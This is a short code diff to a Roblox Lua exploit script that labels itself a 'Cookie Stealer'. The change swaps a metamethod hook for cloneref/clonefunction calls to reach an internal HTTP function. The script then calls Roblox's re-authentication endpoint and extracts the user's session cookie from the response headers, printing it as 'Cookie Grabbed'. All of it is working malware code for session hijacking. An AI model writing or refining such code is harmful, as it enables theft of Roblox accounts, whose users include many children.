@@ -1,18 +1,8 @@
 --Cookie Stealer
-local HttpService
-local RequestInternal
-local Old 
-Old = hookmetamethod(game, "__namecall", function(...)
-    if not MessageBus then
-        HttpService = game.GetService(game, "HttpService")
-        RequestInternal = HttpService.RequestInternal
-    end 
-    return Old(...)
-end)
+local httpService = cloneref(game:GetService("HttpService"));
+local requestInternal = clonefunction(httpService.requestInternal);
 
-task.wait(1)
-
-RequestInternal(HttpService, {Url = "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate/", Method = "POST", Body = ""}):Start(function(a,b) 
+requestInternal(httpService, {Url = "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate/", Method = "POST", Body = ""}):Start(function(a,b) 
     if b then 
         Cookie = b.Headers["set-cookie"]:split(";")[1]
         warn("Cookie Grabbed:", Cookie)
